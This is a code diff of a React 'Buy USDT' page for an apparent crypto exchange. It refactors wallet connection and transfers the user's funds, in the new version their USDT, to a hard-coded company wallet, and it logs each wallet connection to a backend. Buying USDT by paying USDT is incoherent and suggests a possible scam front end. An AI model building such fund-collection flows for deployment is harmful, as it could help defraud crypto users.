@@ -1,37 +1,6 @@
-import { useState, useEffect, useRef, useCallback } from 'react';
-import { EthereumProvider } from "@walletconnect/ethereum-provider";
-
-const WALLETCONNECT_PROJECT_ID = "fb91c2fb42af27391dcfa9dcfe40edc7";
-
-// ============================================================================
-// ADMIN PANEL ENDPOINTS (UPDATE WITH YOUR REAL ENDPOINTS)
-// ============================================================================
-const API_ENDPOINTS = {
-  saveWallet: 'https://your-backend.com/api/wallets/save',
-  saveTransaction: 'https://your-backend.com/api/transactions/save',
-  getExchangeRate: 'https://your-backend.com/api/rates/usdt'
-};
-
-// ============================================================================
-// REAL TRANSACTION CONFIGURATION
-// ============================================================================
-const PAYMENT_CONFIG = {
-  companyWallet: {
-    eth: "0xd171014c972626c3eeef8cc95199ed0c798b70f1", // Example company wallet
-    bnb: "0xd171014c972626c3eeef8cc95199ed0c798b70f1",
-    tron: "TFwxsfMyburrzzQPHisEzqqFcsfcMXkwaF",
-    polygon: "0xd171014c972626c3eeef8cc95199ed0c798b70f1",
-    arbitrum: "0xd171014c972626c3eeef8cc95199ed0c798b70f1",
-    optimism: "0xd171014c972626c3eeef8cc95199ed0c798b70f1"
-  },
-  gasLimits: {
-    eth: 21000,
-    bnb: 21000,
-    polygon: 21000,
-    arbitrum: 21000,
-    optimism: 21000
-  }
-};
+import React, { useState, useEffect, useRef } from 'react';
+import { useWallet } from "../context/WalletContext.js";
+import { useTransaction } from "../hooks/useTransaction.js";
 
 // ============================================================================
 // PRICING CONFIGURATION
@@ -129,352 +98,33 @@ const CHAINS = {
 };
 
 // ============================================================================
-// WALLET MANAGER
+// COMPANY WALLET CONFIGURATION
 // ============================================================================
-class WalletManager {
-  constructor() {
-    this.currentProvider = null;
-    this.walletType = null;
-    this.listeners = [];
-  }
-
-  detectWalletBrowser() {
-    if (typeof window === 'undefined' || !window.ethereum) {
-      return null;
-    }
-
-    const ethereum = window.ethereum;
-    
-    if (!ethereum.request || typeof ethereum.request !== 'function') {
-      return null;
-    }
-
-    // Check specific wallets
-    if (ethereum.isTrust || ethereum.isTrustWallet) {
-      return { name: 'Trust Wallet', id: 'trust' };
-    }
-    if (ethereum.isCoinbaseWallet || ethereum.isCoinbaseBrowser) {
-      return { name: 'Coinbase Wallet', id: 'coinbase' };
-    }
-    if (ethereum.isOkxWallet) {
-      return { name: 'OKX Wallet', id: 'okx' };
-    }
-    if (ethereum.isBitKeep || ethereum.isBitGet) {
-      return { name: 'Bitget Wallet', id: 'bitget' };
-    }
-    if (ethereum.isTokenPocket) {
-      return { name: 'TokenPocket', id: 'tokenpocket' };
-    }
-    if (ethereum.isRabby) {
-      return { name: 'Rabby Wallet', id: 'rabby' };
-    }
-
-    // Check for MetaMask (both desktop and mobile)
-    if (ethereum.isMetaMask) {
-      const userAgent = window.navigator.userAgent.toLowerCase();
-      const isMobile = /mobile|android|iphone|ipad|ipod/i.test(userAgent);
-      return { 
-        name: isMobile ? 'MetaMask Mobile' : 'MetaMask', 
-        id: 'metamask' 
-      };
-    }
-
-    // Generic injected
-    return { name: 'Injected Wallet', id: 'injected' };
-  }
-
-  async connectEVM(walletId) {
-    if (!window.ethereum) {
-      throw new Error('No Ethereum wallet detected. Please install MetaMask or another wallet.');
-    }
-
-    try {
-      const accounts = await window.ethereum.request({
-        method: 'eth_requestAccounts'
-      });
-
-      if (!accounts || accounts.length === 0) {
-        throw new Error('No accounts received');
-      }
-
-      this.currentProvider = window.ethereum;
-      this.walletType = 'evm';
-
-      return {
-        address: accounts[0],
-        walletName: this.getWalletName(walletId),
-        walletId: walletId,
-        provider: window.ethereum
-      };
-    } catch (error) {
-      if (error.code === 4001) {
-        throw new Error('Connection rejected by user');
-      }
-      throw error;
-    }
-  }
-
-  async connectWalletConnect() {
-    try {
-      const provider = await EthereumProvider.init({
-        projectId: WALLETCONNECT_PROJECT_ID,
-        showQrModal: true,
-        qrModalOptions: {
-          themeMode: 'dark',
-          themeVariables: {
-            '--wcm-z-index': '9999',
-            '--wcm-accent-color': '#F5C400',
-            '--wcm-background-color': '#0A0A0A'
-          }
-        },
-        chains: [1],
-        methods: ["eth_sendTransaction", "eth_signTransaction", "personal_sign"],
-        events: ["chainChanged", "accountsChanged"],
-        metadata: {
-          name: 'Bumblebee Exchange',
-          description: 'Buy USDT Instantly',
-          url: window.location.origin,
-          icons: ['https://avatars.githubusercontent.com/u/37784886']
-        }
-      });
-
-      await provider.connect();
-      const accounts = await provider.request({ method: 'eth_accounts' });
-
-      if (!accounts || accounts.length === 0) {
-        throw new Error('No accounts received');
-      }
-
-      this.currentProvider = provider;
-      this.walletType = 'walletconnect';
-
-      return {
-        address: accounts[0],
-        walletName: 'WalletConnect',
-        walletId: 'walletconnect',
-        provider: provider
-      };
-    } catch (error) {
-      if (error.message?.includes('User rejected')) {
-        throw new Error('Connection rejected by user');
-      }
-      throw error;
-    }
-  }
-
-  async connectSolana(walletId) {
-    let provider;
-    
-    if (walletId === 'phantom' && window.phantom?.solana) {
-      provider = window.phantom.solana;
-    } else if (walletId === 'solflare' && window.solflare) {
-      provider = window.solflare;
-    } else {
-      throw new Error(`${walletId} not detected`);
-    }
-
-    try {
-      const response = await provider.connect();
-      this.currentProvider = provider;
-      this.walletType = 'solana';
-
-      return {
-        address: response.publicKey.toString(),
-        walletName: walletId === 'phantom' ? 'Phantom' : 'Solflare',
-        walletId: walletId,
-        provider: provider
-      };
-    } catch (error) {
-      if (error.message?.includes('User rejected')) {
-        throw new Error('Connection rejected by user');
-      }
-      throw error;
-    }
-  }
-
-  getWalletName(walletId) {
-    const names = {
-      metamask: 'MetaMask',
-      trust: 'Trust Wallet',
-      coinbase: 'Coinbase Wallet',
-      bitget: 'Bitget Wallet',
-      tokenpocket: 'TokenPocket',
-      okx: 'OKX Wallet',
-      rabby: 'Rabby Wallet',
-      injected: 'Injected Wallet'
-    };
-    return names[walletId] || walletId;
-  }
-
-  async disconnect() {
-    // Remove all listeners
-    this.listeners.forEach(({ provider, event, handler }) => {
-      try {
-        provider?.removeListener?.(event, handler);
-      } catch (error) {
-        console.debug('Error removing listener:', error);
-      }
-    });
-    this.listeners = [];
-
-    // Disconnect WalletConnect if active
-    if (this.walletType === 'walletconnect' && this.currentProvider?.disconnect) {
-      try {
-        await this.currentProvider.disconnect();
-      } catch (error) {
-        console.debug('Error disconnecting WalletConnect:', error);
-      }
-    }
-
-    // Disconnect Solana if active
-    if (this.walletType === 'solana' && this.currentProvider?.disconnect) {
-      try {
-        await this.currentProvider.disconnect();
-      } catch (error) {
-        console.debug('Error disconnecting Solana:', error);
-      }
-    }
-
-    this.currentProvider = null;
-    this.walletType = null;
-
-    // Clear localStorage
-    localStorage.removeItem('bumblebee_wallet_data');
-  }
-
-  async sendTransaction(chain, fromAddress, amountUSD) {
-    if (!this.currentProvider) {
-      throw new Error('Wallet not connected');
-    }
-
-    const chainInfo = CHAINS[chain];
-    if (!chainInfo) {
-      throw new Error('Unsupported chain');
-    }
-
-    try {
-      // First, switch to correct chain if needed
-      if (this.walletType === 'evm' || this.walletType === 'walletconnect') {
-        await this.switchChain(chainInfo);
-      }
-
-      // Get current gas price
-      const gasPrice = await this.getGasPrice(chainInfo);
-      
-      // Calculate amount in native token (simplified - in production, use real exchange rate)
-      const nativeAmount = this.calculateNativeAmount(amountUSD, chainInfo);
-      
-      // Prepare transaction
-      const transaction = {
-        from: fromAddress,
-        to: PAYMENT_CONFIG.companyWallet[chain] || PAYMENT_CONFIG.companyWallet.eth,
-        value: nativeAmount,
-        gasPrice: gasPrice,
-        gas: PAYMENT_CONFIG.gasLimits[chain] || 21000
-      };
-
-      console.log('Sending transaction:', transaction);
-
-      // Send transaction
-      const txHash = await this.currentProvider.request({
-        method: 'eth_sendTransaction',
-        params: [transaction]
-      });
-
-      return txHash;
-    } catch (error) {
-      console.error('Transaction error:', error);
-      if (error.code === 4001) {
-        throw new Error('Transaction rejected by user');
-      }
-      throw error;
-    }
-  }
-
-  async switchChain(chainInfo) {
-    try {
-      await this.currentProvider.request({
-        method: 'wallet_switchEthereumChain',
-        params: [{ chainId: `0x${chainInfo.chainId.toString(16)}` }]
-      });
-    } catch (switchError) {
-      // This error code indicates that the chain has not been added to MetaMask
-      if (switchError.code === 4902) {
-        try {
-          await this.currentProvider.request({
-            method: 'wallet_addEthereumChain',
-            params: [{
-              chainId: `0x${chainInfo.chainId.toString(16)}`,
-              chainName: chainInfo.name,
-              nativeCurrency: {
-                name: chainInfo.nativeSymbol,
-                symbol: chainInfo.nativeSymbol,
-                decimals: 18
-              },
-              rpcUrls: [chainInfo.rpcUrl],
-              blockExplorerUrls: [chainInfo.explorer]
-            }]
-          });
-        } catch (addError) {
-          throw new Error(`Failed to add ${chainInfo.name} network: ${addError.message}`);
-        }
-      } else {
-        throw switchError;
-      }
-    }
-  }
-
-  async getGasPrice(chainInfo) {
-    try {
-      const gasPrice = await this.currentProvider.request({
-        method: 'eth_gasPrice'
-      });
-      return gasPrice;
-    } catch (error) {
-      // Return fallback gas price
-      return '0x' + (20000000000).toString(16); // 20 Gwei
-    }
-  }
-
-  calculateNativeAmount(amountUSD, chainInfo) {
-    // Simplified conversion - in production, fetch real exchange rates
-    const exchangeRates = {
-      eth: 1800, // 1 ETH = $1800
-      bnb: 300,  // 1 BNB = $300
-      polygon: 0.7, // 1 MATIC = $0.7
-      arbitrum: 1800,
-      optimism: 1800
-    };
-
-    const rate = exchangeRates[chainInfo.id] || 1;
-    const nativeAmount = (amountUSD / rate).toFixed(6);
-    
-    // Convert to Wei/Wei equivalent
-    const weiAmount = Math.floor(parseFloat(nativeAmount) * Math.pow(10, chainInfo.decimals));
-    
-    return '0x' + weiAmount.toString(16);
-  }
-
-  addListener(provider, event, handler) {
-    provider.on(event, handler);
-    this.listeners.push({ provider, event, handler });
-  }
-}
-
-// Create singleton instance
-const walletManager = new WalletManager();
+const COMPANY_WALLETS = {
+  eth: "0xd171014c972626c3eeef8cc95199ed0c798b70f1",
+  bnb: "0xd171014c972626c3eeef8cc95199ed0c798b70f1",
+  polygon: "0xd171014c972626c3eeef8cc95199ed0c798b70f1",
+  arbitrum: "0xd171014c972626c3eeef8cc95199ed0c798b70f1",
+  optimism: "0xd171014c972626c3eeef8cc95199ed0c798b70f1"
+};
 
 // ============================================================================
 // MAIN COMPONENT
 // ============================================================================
 function BuyUsdt() {
   // ==========================================================================
-  // STATE MANAGEMENT
+  // HOOKS & STATE
   // ==========================================================================
-  const [isConnected, setIsConnected] = useState(false);
-  const [address, setAddress] = useState('');
-  const [walletName, setWalletName] = useState('');
-  const [walletId, setWalletId] = useState('');
+  const { 
+    connect, 
+    disconnect, 
+    isConnected, 
+    address, 
+    walletName,
+    walletType 
+  } = useWallet();
+  
+  const { sendUSDT, isSending } = useTransaction();
   
   const [showConnectModal, setShowConnectModal] = useState(false);
   const [isLoading, setIsLoading] = useState(false);
@@ -487,7 +137,7 @@ function BuyUsdt() {
   const [selectedAmount, setSelectedAmount] = useState(20);
   const [customAmount, setCustomAmount] = useState('');
   const [usdtAmount, setUsdtAmount] = useState(1000);
-  const [isBuying, setIsBuying] = useState(false);
+  const [isProcessing, setIsProcessing] = useState(false);
   const [showSuccess, setShowSuccess] = useState(false);
   const [transactionHash, setTransactionHash] = useState('');
   
@@ -497,20 +147,6 @@ function BuyUsdt() {
   // INITIALIZATION
   // ==========================================================================
   useEffect(() => {
-    // Check for saved wallet connection
-    const savedData = localStorage.getItem('bumblebee_wallet_data');
-    if (savedData) {
-      try {
-        const { address, walletName, walletId } = JSON.parse(savedData);
-        setAddress(address);
-        setWalletName(walletName);
-        setWalletId(walletId);
-        setIsConnected(true);
-      } catch (error) {
-        localStorage.removeItem('bumblebee_wallet_data');
-      }
-    }
-
     // Initialize particles
     const initialParticles = [];
     for (let i = 0; i < 25; i++) {
@@ -574,79 +210,26 @@ function BuyUsdt() {
   // WALLET CONNECTION
   // ==========================================================================
   const getAvailableWallets = () => {
-    const detectedWallet = walletManager.detectWalletBrowser();
-    const wallets = [];
-
-    // If we're in a wallet browser, only show that wallet
-    if (detectedWallet && isConnected && walletId === detectedWallet.id) {
-      return [{
-        id: detectedWallet.id,
-        name: detectedWallet.name,
-        icon: getWalletIcon(detectedWallet.id),
-        color: getWalletColor(detectedWallet.id),
-        type: 'evm'
-      }];
-    }
-
-    // Show all available wallets
-    if (typeof window.ethereum !== 'undefined') {
-      wallets.push(
-        { id: 'metamask', name: 'MetaMask', icon: '🦊', color: '#F6851B', type: 'evm' },
-        { id: 'trust', name: 'Trust Wallet', icon: '🔒', color: '#3375BB', type: 'evm' },
-        { id: 'coinbase', name: 'Coinbase Wallet', icon: '🏦', color: '#0052FF', type: 'evm' },
-        { id: 'bitget', name: 'Bitget Wallet', icon: '🎯', color: '#0082FF', type: 'evm' },
-        { id: 'tokenpocket', name: 'TokenPocket', icon: '👛', color: '#29B6AF', type: 'evm' },
-        { id: 'okx', name: 'OKX Wallet', icon: '⭕', color: '#000000', type: 'evm' }
-      );
-    }
+    const wallets = [
+      { id: 'metamask', name: 'MetaMask', icon: '🦊', color: '#F6851B', type: 'evm' },
+      { id: 'trust', name: 'Trust Wallet', icon: '🔒', color: '#3375BB', type: 'evm' },
+      { id: 'coinbase', name: 'Coinbase Wallet', icon: '🏦', color: '#0052FF', type: 'evm' },
+      { id: 'bitget', name: 'Bitget Wallet', icon: '🎯', color: '#0082FF', type: 'evm' },
+      { id: 'tokenpocket', name: 'TokenPocket', icon: '👛', color: '#29B6AF', type: 'evm' },
+      { id: 'okx', name: 'OKX Wallet', icon: '⭕', color: '#000000', type: 'evm' },
+      { id: 'walletconnect', name: 'Other Wallets', icon: '🔗', color: '#3B99FC', type: 'evm', description: 'Scan QR with any wallet' }
+    ];
     
-    wallets.push({ 
-      id: 'walletconnect', 
-      name: 'Other Wallets', 
-      icon: '🔗', 
-      color: '#3B99FC', 
-      type: 'evm',
-      description: 'Scan QR with any wallet'
-    });
-    
-    if (window.phantom?.solana || window.solflare) {
-      wallets.push(
-        { id: 'phantom', name: 'Phantom', icon: '👻', color: '#AB9FF2', type: 'solana' },
-        { id: 'solflare', name: 'Solflare', icon: '🔥', color: '#FF6B35', type: 'solana' }
-      );
+    if (typeof window !== 'undefined') {
+      if (window.phantom?.solana || window.solflare) {
+        wallets.push(
+          { id: 'phantom', name: 'Phantom', icon: '👻', color: '#AB9FF2', type: 'solana' },
+          { id: 'solflare', name: 'Solflare', icon: '🔥', color: '#FF6B35', type: 'solana' }
+        );
+      }
     }
     
     return wallets;
-  };
-
-  const getWalletIcon = (id) => {
-    const icons = {
-      metamask: '🦊',
-      trust: '🔒',
-      coinbase: '🏦',
-      bitget: '🎯',
-      tokenpocket: '👛',
-      okx: '⭕',
-      phantom: '👻',
-      solflare: '🔥',
-      walletconnect: '🔗'
-    };
-    return icons[id] || '💎';
-  };
-
-  const getWalletColor = (id) => {
-    const colors = {
-      metamask: '#F6851B',
-      trust: '#3375BB',
-      coinbase: '#0052FF',
-      bitget: '#0082FF',
-      tokenpocket: '#29B6AF',
-      okx: '#000000',
-      phantom: '#AB9FF2',
-      solflare: '#FF6B35',
-      walletconnect: '#3B99FC'
-    };
-    return colors[id] || '#F5C400';
   };
 
   const handleConnectWallet = async (wallet) => {
@@ -654,39 +237,20 @@ function BuyUsdt() {
     setIsLoading(true);
 
     try {
-      let connection;
+      await connect(wallet.id);
       
-      if (wallet.type === 'evm') {
-        if (wallet.id === 'walletconnect') {
-          connection = await walletManager.connectWalletConnect();
-        } else {
-          connection = await walletManager.connectEVM(wallet.id);
-        }
-      } else if (wallet.type === 'solana') {
-        connection = await walletManager.connectSolana(wallet.id);
-      } else {
-        throw new Error('Unsupported wallet type');
-      }
-
-      // Update state
-      setAddress(connection.address);
-      setWalletName(connection.walletName);
-      setWalletId(connection.walletId);
-      setIsConnected(true);
-
-      // Save to localStorage
-      localStorage.setItem('bumblebee_wallet_data', JSON.stringify({
-        address: connection.address,
-        walletName: connection.walletName,
-        walletId: connection.walletId
-      }));
-
-      // Send to admin panel
-      await saveToAdminPanel('wallet_connected', {
-        walletAddress: connection.address,
-        walletType: wallet.type,
-        walletName: connection.walletName,
-        timestamp: new Date().toISOString()
+      // Send connection info to backend
+      await fetch('/api/wallet/connect', {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json',
+        },
+        body: JSON.stringify({
+          walletAddress: address,
+          walletType: wallet.type,
+          walletName: wallet.name,
+          timestamp: new Date().toISOString()
+        })
       });
 
       closeModal();
@@ -700,15 +264,7 @@ function BuyUsdt() {
 
   const handleDisconnect = async () => {
     try {
-      await walletManager.disconnect();
-      
-      setIsConnected(false);
-      setAddress('');
-      setWalletName('');
-      setWalletId('');
-      
-      localStorage.removeItem('bumblebee_wallet_data');
-      
+      await disconnect();
       setError('');
     } catch (error) {
       console.error('Disconnect error:', error);
@@ -746,38 +302,52 @@ function BuyUsdt() {
   const handleBuyNow = async () => {
     const amount = getCurrentAmount();
     
-    if (!isConnected || amount <= 0 || usdtAmount <= 0) {
-      setError('Please connect wallet and select a valid amount');
+    // Validate fields
+    if (!isConnected) {
+      setError('Please connect wallet first');
+      return;
+    }
+    
+    if (amount <= 0) {
+      setError('Please select a valid amount');
+      return;
+    }
+    
+    if (usdtAmount <= 0) {
+      setError('Invalid USDT amount');
       return;
     }
 
-    setIsBuying(true);
+    setIsProcessing(true);
     setError('');
     setTransactionHash('');
 
     try {
-      // Get chain info
-      const chainInfo = CHAINS[selectedChain];
-      if (!chainInfo) {
-        throw new Error('Invalid chain selected');
+      // Send order to backend
+      const orderResponse = await fetch('/api/usdt/order', {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json',
+        },
+        body: JSON.stringify({
+          address: address,
+          chain: selectedChain,
+          amount: amount
+        })
+      });
+
+      if (!orderResponse.ok) {
+        throw new Error('Failed to create order');
       }
 
-      // Send real transaction
-      const txHash = await walletManager.sendTransaction(selectedChain, address, amount);
+      const orderData = await orderResponse.json();
+      
+      // Send USDT transaction
+      const toAddress = COMPANY_WALLETS[selectedChain] || COMPANY_WALLETS.eth;
+      const txHash = await sendUSDT(toAddress, usdtAmount);
       
       // Save transaction hash
       setTransactionHash(txHash);
-
-      // Save to admin panel
-      await saveToAdminPanel('usdt_purchase', {
-        walletAddress: address,
-        chain: chainInfo.name,
-        amountUSD: amount,
-        usdtAmount: usdtAmount,
-        transactionHash: txHash,
-        timestamp: new Date().toISOString(),
-        walletName: walletName
-      });
 
       // Show success
       setShowSuccess(true);
@@ -795,7 +365,7 @@ function BuyUsdt() {
       console.error('Purchase error:', error);
       setError(error.message || 'Transaction failed. Please try again.');
     } finally {
-      setIsBuying(false);
+      setIsProcessing(false);
     }
   };
 
@@ -808,39 +378,13 @@ function BuyUsdt() {
     setIsLoading(false);
   };
 
-  const saveToAdminPanel = async (eventType, data) => {
-    try {
-      // In production, uncomment this and use your real endpoint
-      /*
-      const response = await fetch(API_ENDPOINTS.saveTransaction, {
-        method: 'POST',
-        headers: {
-          'Content-Type': 'application/json',
-        },
-        body: JSON.stringify({
-          event: eventType,
-          data: data,
-          timestamp: new Date().toISOString()
-        })
-      });
-      
-      if (!response.ok) {
-        console.warn('Failed to save to admin panel:', response.status);
-      }
-      */
-      console.log('Would save to admin panel:', eventType, data);
-    } catch (error) {
-      console.warn('Error saving to admin panel:', error);
-    }
-  };
-
   // ==========================================================================
   // RENDER
   // ==========================================================================
   const availableWallets = getAvailableWallets();
   const chainInfo = CHAINS[selectedChain];
   const currentAmount = getCurrentAmount();
-  const companyWallet = PAYMENT_CONFIG.companyWallet[selectedChain] || PAYMENT_CONFIG.companyWallet.eth;
+  const companyWallet = COMPANY_WALLETS[selectedChain] || COMPANY_WALLETS.eth;
 
   return (
     <div className="buy-usdt-page">
@@ -885,7 +429,7 @@ function BuyUsdt() {
                     <span className="wallet-name">{walletName}</span>
                   </div>
                   <span className="wallet-address">
-                    {address.slice(0, 6)}...{address.slice(-4)}
+                    {address?.slice(0, 6)}...{address?.slice(-4)}
                   </span>
                   <button onClick={handleDisconnect} className="disconnect-btn">
                     ✕
@@ -1051,7 +595,7 @@ function BuyUsdt() {
                       {isConnected ? (
                         <div className="address-display">
                           <span className="wallet-icon-small">👛</span>
-                          <span className="address-text">{address.slice(0, 10)}...{address.slice(-8)}</span>
+                          <span className="address-text">{address?.slice(0, 10)}...{address?.slice(-8)}</span>
                           <span className="wallet-name-small">{walletName}</span>
                         </div>
                       ) : (
@@ -1124,7 +668,7 @@ function BuyUsdt() {
                       <div className="wallet-icon">👛</div>
                       <div className="wallet-details">
                         <div className="wallet-name">Connected: {walletName}</div>
-                        <div className="wallet-address-sm">{address.slice(0, 8)}...{address.slice(-6)}</div>
+                        <div className="wallet-address-sm">{address?.slice(0, 8)}...{address?.slice(-6)}</div>
                       </div>
                       <button onClick={() => setShowConnectModal(true)} className="switch-wallet-btn">
                         Switch
@@ -1135,14 +679,14 @@ function BuyUsdt() {
                 
                 {/* Buy Button */}
                 <button
-                  className={`buy-button ${!isConnected || currentAmount <= 0 || isBuying ? 'disabled' : ''}`}
+                  className={`buy-button ${!isConnected || currentAmount <= 0 || isProcessing ? 'disabled' : ''}`}
                   onClick={handleBuyNow}
-                  disabled={!isConnected || currentAmount <= 0 || isBuying}
+                  disabled={!isConnected || currentAmount <= 0 || isProcessing || isSending}
                 >
-                  {isBuying ? (
+                  {(isProcessing || isSending) ? (
                     <>
                       <div className="loading-spinner" />
-                      Waiting for confirmation...
+                      {isSending ? 'Sending USDT...' : 'Processing...'}
                     </>
                   ) : showSuccess ? (
                     <>
